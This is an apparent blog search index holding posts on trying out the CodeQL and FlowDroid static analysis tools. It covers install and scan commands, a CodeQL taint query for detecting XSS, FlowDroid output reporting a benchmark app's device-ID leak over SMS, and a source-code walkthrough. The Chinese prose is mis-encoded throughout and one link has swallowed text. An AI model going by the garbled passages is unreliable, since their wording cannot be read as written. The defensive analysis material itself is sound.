<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CodeQL è¯•ç”¨</title>
      <link href="/whitebox-CodeQL%E5%88%9D%E6%8E%A2/"/>
      <url>/whitebox-CodeQL%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<p>CodeQLæ˜¯ä¸€ç§åˆ†æå¼•æ“ï¼Œå…¶é¦–å…ˆå°†codeè½¬æ¢ä¸ºdatabaseï¼Œå†é€šè¿‡ç±»QLçš„æ–¹å¼æŒ–æ˜æ¼æ´ã€‚LGTMåŸºäºCodeQLæä¾›åœ¨çº¿æœåŠ¡ã€‚</p><h1 id="æ¼æ´ç±»å‹"><a href="#æ¼æ´ç±»å‹" class="headerlink" title="æ¼æ´ç±»å‹"></a>æ¼æ´ç±»å‹</h1><p>æ•°æ®æµåˆ†æå’Œæ¨¡å¼åŒ¹é…ç±»å‹æ¼æ´</p><h1 id="è¦†ç›–è¯­è¨€"><a href="#è¦†ç›–è¯­è¨€" class="headerlink" title="è¦†ç›–è¯­è¨€"></a>è¦†ç›–è¯­è¨€</h1><p>â€¢ C/C++<br>â€¢ C#<br>â€¢ Go<br>â€¢ Java<br>â€¢ Python<br>â€¢ JavaScriptï¼ˆIncludes JSX and Flow code, YAML, JSON, HTML, and XML filesï¼‰<br>â€¢ TypeScript[New]<br>è¯¦æƒ…è§ï¼š<a href="https://help.semmle.com/codeql/supported-languages-and-frameworks.html#" target="_blank" rel="noopener">https://help.semmle.com/codeql/supported-languages-and-frameworks.html#</a></p><a id="more"></a><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><h2 id="CLI-å®‰è£…"><a href="#CLI-å®‰è£…" class="headerlink" title="CLI å®‰è£…"></a>CLI å®‰è£…</h2><p>ä¸‹è½½ä¸‰ä¸ªç»„ä»¶ï¼Œæ”¾åœ¨code-homeç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ codeql          <span class="comment"># codeqlå¼•æ“ï¼Œhttps://github.com/github/codeql-cli-binaries/releases</span></span><br><span class="line">â”œâ”€â”€ codeql-go       <span class="comment"># goè§£æï¼Œhttps://github.com/github/codeql-go/</span></span><br><span class="line">â””â”€â”€ codeql-repo <span class="comment"># è§„åˆ™ï¼Œhttps://github.com/github/codeql</span></span><br></pre></td></tr></table></figure><p>éªŒè¯ï¼ŒæŸ¥è¯¢è§„åˆ™é›†ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./codeql/codeql resolve qlpacks</span><br><span class="line">codeql-cpp (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/cpp/ql/src)</span><br><span class="line">codeql-cpp-tests (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/cpp/ql/<span class="built_in">test</span>)</span><br><span class="line">codeql-cpp-upgrades (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/cpp/upgrades)</span><br><span class="line">codeql-csharp (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/csharp/ql/src)</span><br><span class="line">codeql-csharp-tests (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/csharp/ql/<span class="built_in">test</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><h2 id="æ„å»ºè¢«æµ‹é¡¹ç›®æ•°æ®åº“"><a href="#æ„å»ºè¢«æµ‹é¡¹ç›®æ•°æ®åº“" class="headerlink" title="æ„å»ºè¢«æµ‹é¡¹ç›®æ•°æ®åº“"></a>æ„å»ºè¢«æµ‹é¡¹ç›®æ•°æ®åº“</h2><p>å¯¹äºè§£é‡Šå‹è¯­è¨€ç¼–å†™çš„é¡¹ç›®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=&lt;language-identifier&gt; --<span class="built_in">source</span>-root &lt;folder-to-extract&gt; &lt;database&gt;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=javascript codeql-database</span><br></pre></td></tr></table></figure><p>å¯¹äºç¼–è¯‘å‹è¯­è¨€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=cpp &lt;output-folder&gt;/cpp-database --<span class="built_in">command</span>=make</span><br></pre></td></tr></table></figure><p>commandä¸æŒ‡å®šåˆ™ä¼šä½¿ç”¨è‡ªå¸¦çš„é»˜è®¤ç¼–è¯‘</p><p>ç‰¹æ®Šçš„identifierï¼š</p><ul><li>c/c++ï¼šcpp</li><li>c#ï¼šcsharp</li><li>JavaScript/TypeScriptï¼šjavascript</li></ul><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒLGTMçš„å®ç°ä¸­ä¼šåŒæ—¶è°ƒç”¨æ‰€æœ‰è¯­è¨€æ„å»ºã€‚</p><h2 id="å‘èµ·æ‰«æ"><a href="#å‘èµ·æ‰«æ" class="headerlink" title="å‘èµ·æ‰«æ"></a>å‘èµ·æ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database analyze &lt;database&gt; &lt;queries&gt; --format=&lt;format&gt; --output=&lt;output&gt; --threads=&lt;threads&gt;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼ˆæ³¨æ„è¿™é‡Œé€‰æ‹©äº†lgtmçš„è§„åˆ™é›†ï¼‰ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database analyze ./codeql-database/ ~/workspace/codeql-home/codeql-repo/javascript/ql/src/codeql-suites/javascript-lgtm-full.qls --format=csv --output=codeql.csv --threads=10</span><br></pre></td></tr></table></figure></p><h1 id="è§„åˆ™ç¼–å†™"><a href="#è§„åˆ™ç¼–å†™" class="headerlink" title="è§„åˆ™ç¼–å†™"></a>è§„åˆ™ç¼–å†™</h1><p>CodeQLç¼–å†™æŒ‡å—ï¼š <a href="https://github.com/github/codeql/blob/master/docs/ql-style-guide.md" target="_blank" rel="noopener">https://github.com/github/codeql/blob/master/docs/ql-style-guide.md</a>ï¼Œ<a href="https://help.semmle.com/QL/learn-ql/" target="_blank" rel="noopener">https://help.semmle.com/QL/learn-ql/</a>ï¼Œä»¥ä¸‹ä»£ç ä¸ºä¸€ä¾‹åˆ©ç”¨æ±¡ç‚¹åˆ†ææ£€æµ‹XSSçš„æ£€æµ‹è§„åˆ™ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.XSS</span><br><span class="line">import DataFlow2::PathGraph</span><br><span class="line">class XSSConfig extends TaintTracking::Configuration2 &#123;</span><br><span class="line">  XSSConfig() &#123; this = "XSSConfig" &#125;</span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;</span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof XssSink &#125;</span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof NumericType or node.getType() instanceof BooleanType</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">from DataFlow2::PathNode source, DataFlow2::PathNode sink, XSSConfig conf</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink.getNode(), <span class="keyword">source</span>, sink, <span class="string">"Cross-site scripting vulnerability due to $@."</span>,</span><br><span class="line">  source.getNode(), <span class="string">"user-provided value"</span></span><br></pre></td></tr></table></figure><p>ç”¨CodeQLåšåˆ†æçš„ä»‹ç»å…¶ä»–ç ”ç©¶è€…å·²ç»å†™è¿‡å¾ˆå¤šäº†ï¼Œè¿™é‡Œä¸åšä»‹ç»</p>]]></content>
      
      
      <categories>
          
          <category> æºç å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æºç å®‰å…¨ </tag>
            
            <tag> CodeQL </tag>
            
            <tag> LGTM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FlowDroid å·¥å…·ä»‹ç»å’Œè¯•ç”¨ï¼ˆè‰ç¨¿ï¼‰</title>
      <link href="/pl-FlowDroid%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AF%95%E7%94%A8/"/>
      <url>/pl-FlowDroid%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AF%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="å·¥å…·ä»‹ç»"><a href="#å·¥å…·ä»‹ç»" class="headerlink" title="å·¥å…·ä»‹ç»"></a>å·¥å…·ä»‹ç»</h1><p>FlowDroid[1,2] æ˜¯ Arzt ç­‰äººè®¾è®¡çš„ä¸€æ¬¾ä¸Šä¸‹æ–‡æ•æ„Ÿï¼ˆå¯¹è±¡æ•æ„Ÿï¼‰ï¼Œæµæ•æ„Ÿï¼ŒåŸŸæ•æ„Ÿçš„é™æ€æ±¡ç‚¹åˆ†æå·¥å…·ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä¸å…¶ä»–æ±¡ç‚¹åˆ†æå·¥å…·ï¼ˆå¦‚TAJï¼‰ä¸åŒçš„æ˜¯å…¶é’ˆå¯¹å®‰å“åº”ç”¨ï¼Œå¯¹å®‰å“åº”ç”¨çš„ç‰¹æ€§åšäº†å¾ˆå¤šæ”¹è¿›å’Œä¼˜åŒ–ã€‚</p><p>è¯¥å·¥å…·åŸºäºSoot[3]å’ŒHeros[4]ï¼Œsootä½œä¸ºç»å…¸çš„Javaè¯­è¨€åˆ†ææ¡†æ¶ï¼Œèƒ½æä¾›SSAå’Œcallgraphï¼ŒHerosæ˜¯ä¸€ä¸ªé€šç”¨çš„IFDS/IDSåˆ†ææ¡†æ¶ï¼Œé€Ÿåº¦æ²¡æœ‰WALAå¿«ï¼Œä½†æ˜¯æ¯”WALAæ›´é€šç”¨ã€‚</p><a id="more"></a><p><img src="/pl-FlowDroidå·¥å…·ä»‹ç»å’Œè¯•ç”¨/aliasFlow.png" alt="aliasFlow"></p><p>FlowDroid åœ¨æ±¡ç‚¹åˆ†ææ—¶å‚è€ƒäº†[Andromeda][<a href="http://www.cs.tau.ac.il/~omertrip/fase13/paper.pdf]çš„åšæ³•ï¼Œæœ‰ä¸€å®šçš„åˆ«ååˆ†æï¼Œå…·ä½“æ¥è¯´ï¼Œå½“æ±¡ç‚¹è¢«loadè‡³ä¸€ä¸ªå †åŒºï¼ˆå¦‚å›¾ä¸­`x.f=w`ï¼‰æ—¶ï¼Œè¿›è¡Œåå‘åˆ†æï¼Œæ±¡æŸ“åˆ«åå˜é‡ï¼ˆå¦‚å›¾ä¸­çš„z.g.f" target="_blank" rel="noopener">http://www.cs.tau.ac.il/~omertrip/fase13/paper.pdf]çš„åšæ³•ï¼Œæœ‰ä¸€å®šçš„åˆ«ååˆ†æï¼Œå…·ä½“æ¥è¯´ï¼Œå½“æ±¡ç‚¹è¢«loadè‡³ä¸€ä¸ªå †åŒºï¼ˆå¦‚å›¾ä¸­`x.f=w`ï¼‰æ—¶ï¼Œè¿›è¡Œåå‘åˆ†æï¼Œæ±¡æŸ“åˆ«åå˜é‡ï¼ˆå¦‚å›¾ä¸­çš„z.g.f</a>, a.g.fï¼‰ï¼Œå†æ£€æŸ¥æ±¡ç‚¹æ˜¯å¦è¿›å…¥sinkï¼ˆå¦‚å›¾ä¸­b.fï¼‰ï¼Œå…·ä½“ç®—æ³•åæ–‡ä¼šåšåˆ†æã€‚</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><h2 id="æ„å»ºå·¥å…·"><a href="#æ„å»ºå·¥å…·" class="headerlink" title="æ„å»ºå·¥å…·"></a>æ„å»ºå·¥å…·</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout v2.8 <span class="comment"># å…ˆåˆ‡æ¢åˆ°ç¨³å®šç‰ˆæœ¬</span></span><br><span class="line"><span class="built_in">export</span> ANDROID_JARS=/mnt/d/java_lib/Android/android-sdk/platforms</span><br><span class="line"><span class="built_in">export</span> DROIDBENCH=/mnt/d/PA/FlowDroid/DroidBench</span><br><span class="line">mvn -DskipTests install</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šv2.8åˆ†æ”¯ä¾èµ–çš„sootç‰ˆæœ¬æ˜¯4.3.0-SNAPSHOTï¼Œè€Œgithubçš„sootä»“åº“æœ€é«˜ç‰ˆæœ¬è¿˜æ˜¯4.2.1ï¼Œå› æ­¤è¿™é‡Œæˆ‘æ‰‹åŠ¨æ”¹ä¸€ä¸‹ï¼Œå¸Œæœ›ä¸è¦å‡ºäº‹Orz</p><h2 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar soot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar -a DroidBench/apk/GeneralJava/Clone1.apk -p <span class="variable">$ANDROID_JARS</span> -s soot-infoflow-android/SourcesAndSinks.txt</span><br></pre></td></tr></table></figure><p>æœ‰å¦‚ä¸‹ç»“æœ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar soot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar -a DroidBench/apk/GeneralJava/Loop1.apk -p <span class="variable">$ANDROID_JARS</span> -s soot-infoflow-android/SourcesAndSinks.txt</span><br><span class="line">[main] INFO soot.jimple.infoflow.cmd.MainClass - Analyzing app /mnt/d/program-analysis/FlowDroid/DroidBench/apk/GeneralJava/Loop1.apk (1 of 1)...</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication - Initializing Soot...</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication - Loading dex files...</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication - ARSC file parsing took 0.0135045 seconds</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication<span class="variable">$InPlaceInfoflow</span> - The sink virtualinvoke <span class="variable">$r7</span>.&lt;android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)&gt;(<span class="string">"+49 1234"</span>, null, r5, null, null) <span class="keyword">in</span> method &lt;de.ecspride.LoopExample1: void onCreate(android.os.Bundle)&gt; was called with values from the following sources:</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication<span class="variable">$InPlaceInfoflow</span> - - <span class="variable">$r4</span> = virtualinvoke r3.&lt;android.telephony.TelephonyManager: java.lang.String getDeviceId()&gt;() <span class="keyword">in</span> method &lt;de.ecspride.LoopExample1: void onCreate(android.os.Bundle)&gt;</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication<span class="variable">$InPlaceInfoflow</span> - Data flow solver took 0 seconds. Maximum memory consumption: 53 MB</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication - Found 1 leaks</span><br></pre></td></tr></table></figure><h1 id="æºç è§£æ"><a href="#æºç è§£æ" class="headerlink" title="æºç è§£æ"></a>æºç è§£æ</h1><p>é¦–å…ˆFlowDroidé¡¹ç›®æœ‰å››ä¸ªå­é¡¹ç›®ï¼š</p><ul><li>soot-infoflowï¼š æ•°æ®æµåˆ†ææ ¸å¿ƒåŒ…ï¼ˆåŸºäºSootï¼‰</li><li>soot-infoflowandroidï¼š ä¸å®‰å“ç‰¹æ€§ç›¸å…³çš„æ•°æ®æµåˆ†æ</li><li>soot-infoflow-summariesï¼šè¿˜ä¸æ¸…æ¥šï¼Œåƒæ˜¯åšå‡½æ•°æ‘˜è¦çš„ç±»</li><li>soot-infoflow-cmdï¼šå‘½ä»¤è¡Œå…¥å£</li></ul><h2 id="soot-jimple-infoflow-cmd-MainClass-main"><a href="#soot-jimple-infoflow-cmd-MainClass-main" class="headerlink" title="soot.jimple.infoflow.cmd.MainClass#main"></a>soot.jimple.infoflow.cmd.MainClass#main</h2><p>å…ˆä»å…¥å£å¼€å§‹ï¼Œç¨‹åºå…¥å£åœ¨soot-infoflow-cmdåŒ…ä¸‹é¢çš„<code>soot.jimple.infoflow.cmd.MainClass</code>ï¼Œä¸»è¦é€šè¿‡å‘½ä»¤ä¼ å…¥ä¸€äº›é…ç½®ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š</p><ul><li>-apkfileï¼šapkæ–‡ä»¶</li><li>-platformsdirï¼šAndroid SDK</li><li>-platformsdirï¼š Source &amp; Sinkå®šä¹‰</li><li>-outputfileï¼šè¾“å‡ºæ–‡ä»¶</li><li>-timeoutï¼šæ•°æ®æµåˆ†æè¶…æ—¶æ—¶é—´</li><li>-callbacktimeoutï¼šcallbackæ”¶é›†è¶…æ—¶æ—¶é—´</li></ul><p>ä¸ç‰¹æ€§ã€ç®—æ³•ç›¸å…³ï¼š</p><ul><li>-nostaticï¼šä¸åˆ†æé™æ€æ•°æ®æµ</li><li>-nocallbacksï¼šä¸åˆ†æcallback</li><li>-noexceptionsï¼šä¸åˆ†æexceptionæ•°æ®æµ</li><li>-notypecheckingï¼šä¸åˆ†ææ±¡ç‚¹ç±»å‹æ£€æŸ¥</li><li>-enablereflectionï¼šå…è®¸åå°„ç‰¹æ€§</li><li>-missingsummariesoutputfileï¼šåˆ—å‡ºå‡½æ•°æ‘˜è¦ç¼ºå¤±çš„ç±»</li><li>-outputlinenumbersï¼šåˆ—å‡ºbytecode line number</li><li>-taintwrapperï¼šã€TODOã€‘è¿™ä¸ªä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå¯ä»¥è®¾ç½®Noneï¼ŒEASYï¼ŒSTUBDROIDæˆ–BULTI</li><li>-taintwrapperfileï¼šè®¾ç½®æ±¡ç‚¹æ–‡ä»¶</li><li>-aplengthï¼šè·¯å¾„æœ€å¤§é•¿åº¦</li><li>-cgalgoï¼šè°ƒç”¨å›¾ç”Ÿæˆç®—æ³•ï¼Œe.g. CHAï¼ŒVTAï¼ŒRTAï¼ŒSPARK, GEOM</li><li>-pathalgoï¼šè¿”å›ç»“æœç®—æ³•ï¼Œe.g., CONTEXTSENSITIVE, CONTEXTINSENSITIVE, SOURCESONLY</li><li>-dataflowsolverï¼šæ•°æ®æµè§£æç®—æ³•, e.g., CONTEXTFLOWSENSITIVE, FLOWINSENSITIVE</li></ul><p>è¿˜æœ‰å¾ˆå¤šé…ç½®ç­‰ç”¨åˆ°æ—¶å†åˆ†æã€‚</p><p>æ¥ç€è®¾ç½®ITaintPropagationWrapperï¼Œè¯¥æ¥å£ç”¨äºä½¿ç”¨å‡½æ•°æ‘˜è¦ä¼ æ’­æ±¡ç‚¹ï¼Œä¸»è¦ç”¨äºåŠ é€Ÿåˆ†æä»¥åŠå¯¹æŠ—æºä»£ç ä¸å­˜åœ¨ä»¥åŠnativeçš„æƒ…å†µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initialize the taint wrapper. We only do this once for all apps to cache</span></span><br><span class="line"><span class="comment">// summaries that we have already loaded.</span></span><br><span class="line">ITaintPropagationWrapper taintWrapper = initializeTaintWrapper(cmd);</span><br></pre></td></tr></table></figure><p>æ¥ç€æ ¹æ®é…ç½®äº§ç”Ÿä¸€ä¸ªanalyzerï¼ˆSetupApplicationï¼Œç»§æ‰¿è‡ªITaintWrapperDataFlowAnalysisï¼‰ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create the data flow analyzer</span></span><br><span class="line">analyzer = createFlowDroidInstance(config);</span><br><span class="line">analyzer.setTaintWrapper(taintWrapper);</span><br></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨analyzer.runInfoflow()å¯åŠ¨åˆ†æä¸»æµç¨‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Start the data flow analysis</span></span><br><span class="line">analyzer.runInfoflow();</span><br></pre></td></tr></table></figure><h2 id="soot-jimple-infoflow-android-SetupApplication-runInfoflow"><a href="#soot-jimple-infoflow-android-SetupApplication-runInfoflow" class="headerlink" title="soot.jimple.infoflow.android.SetupApplication#runInfoflow()"></a>soot.jimple.infoflow.android.SetupApplication#runInfoflow()</h2><p>ç°åœ¨è¿›å…¥äº†soot-infoflow-androidåŒ…ï¼Œåœ¨runInfoflow()ä¸­ï¼Œå…ˆè°ƒç”¨ISourceSinkDefinitionProviderè¯»å–source-sinkæ–‡ä»¶ï¼Œæ–‡ä»¶å¯ä»¥æœ‰ä¸‰ç§æ ¼å¼ï¼šxml, txtå’Œriflï¼Œæ¥ç€è°ƒç”¨SetupApplication.runInfoflow(ISourceSinkDefinitionProvider)ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InfoflowResults <span class="title">runInfoflow</span><span class="params">()</span> <span class="keyword">throws</span> IOException, XmlPullParserException </span>&#123;</span><br><span class="line">    <span class="comment">// If we don't have a source/sink file by now, we cannot run the data</span></span><br><span class="line">    <span class="comment">// flow analysis</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    ISourceSinkDefinitionProvider parser = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileExtension.equals(<span class="string">".xml"</span>)) &#123;</span><br><span class="line">            parser = XMLSourceSinkParser.fromFile(sourceSinkFile,</span><br><span class="line">                    <span class="keyword">new</span> ConfigurationBasedCategoryFilter(config.getSourceSinkConfig()));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileExtension.equals(<span class="string">".txt"</span>))</span><br><span class="line">            parser = PermissionMethodParser.fromFile(sourceSinkFile);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (fileExtension.equals(<span class="string">".rifl"</span>))</span><br><span class="line">            parser = <span class="keyword">new</span> RIFLSourceSinkDefinitionProvider(sourceSinkFile);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedSourceSinkFormatException(<span class="string">"The Inputfile isn't a .txt or .xml file."</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SAXException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Could not read XML file"</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> runInfoflow(parser);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ SetupApplication.runInfoflow(ISourceSinkDefinitionProvider)ä¸­ï¼Œé¦–å…ˆåˆå§‹åŒ–Sootâ€”â€”<code>initializeSoot()</code>ï¼ŒåŒ…æ‹¬åˆ¶å®šæŒ‡é’ˆåˆ†ææ–¹æ³•ï¼ˆé»˜è®¤SPARKï¼‰ã€ç»™ä¸€äº›ç‰¹å®šè°ƒç”¨æ·»åŠ CallGraphè¾¹â€”â€”<code>LibraryClassPatcher.patchLibraries(</code>)ï¼›æ¥ç€è¯»å–Androidèµ„æºå’Œé…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬AndroidManifest.xmlæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ç”¨äºè·å–åˆ†æå…¥å£ï¼›æ¥ç€å¯¹entrypointè¿›è¡Œåˆ†æâ€”â€”<code>SetupApplication.processEntryPoint</code>ï¼›æœ€åæ”¶é›†åˆ†æç»“æœå¹¶è¿”å›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InfoflowResults <span class="title">runInfoflow</span><span class="params">(ISourceSinkDefinitionProvider sourcesAndSinks)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Start a new Soot instance</span></span><br><span class="line">G.reset();</span><br><span class="line">initializeSoot();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Perform basic app parsing</span></span><br><span class="line">parseAppResources();</span><br><span class="line"></span><br><span class="line">MultiRunResultAggregator resultAggregator = <span class="keyword">new</span> MultiRunResultAggregator();</span><br><span class="line"></span><br><span class="line"><span class="comment">// In one-component-at-a-time, we do not have a single entry point</span></span><br><span class="line"><span class="comment">// creator. For every entry point, run the data flow analysis.</span></span><br><span class="line">processEntryPoint(sourcesAndSinks, resultAggregator, -<span class="number">1</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write the results to disk if requested</span></span><br><span class="line">serializeResults(resultAggregator.getAggregatedResults(), resultAggregator.getLastICFG());</span><br><span class="line"></span><br><span class="line"><span class="comment">// We return the aggregated results</span></span><br><span class="line"><span class="keyword">this</span>.infoflow = <span class="keyword">null</span>;</span><br><span class="line">resultAggregator.clearLastResults();</span><br><span class="line"><span class="keyword">return</span> resultAggregator.getAggregatedResults();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="soot-jimple-infoflow-Infoflow-runAnalysis-ISourceSinkManager-Set"><a href="#soot-jimple-infoflow-Infoflow-runAnalysis-ISourceSinkManager-Set" class="headerlink" title="soot.jimple.infoflow.Infoflow#runAnalysis(ISourceSinkManager, Set\)"></a>soot.jimple.infoflow.Infoflow#runAnalysis(ISourceSinkManager, Set\<string\>)</string\></h2><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://blogs.uni-paderborn.de/sse/tools/flowdroid/" target="_blank" rel="noopener">https://blogs.uni-paderborn.de/sse/tools/flowdroid/</a></li><li><a href="https://github.com/secure-software-engineering/FlowDroid" target="_blank" rel="noopener">https://github.com/secure-software-engineering/FlowDroid</a></li><li><a href="https://github.com/soot-oss/soot" target="_blank" rel="noopener">https://github.com/soot-oss/soot</a></li><li><a href="http://sable.github.io/heros/" target="_blank" rel="noopener">http://sable.github.io/heros/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> æ±¡ç‚¹åˆ†æ </tag>
            
            <tag> FlowDroid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŒ—å¤§ç¨‹åºåˆ†æï¼ˆSSAå’Œç¨€ç–åˆ†æï¼‰</title>
      <link href="/pl-%E5%8C%97%E5%A4%A7%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88SSA%E5%92%8C%E7%A8%80%E7%96%8F%E5%88%86%E6%9E%90%EF%BC%89/"/>
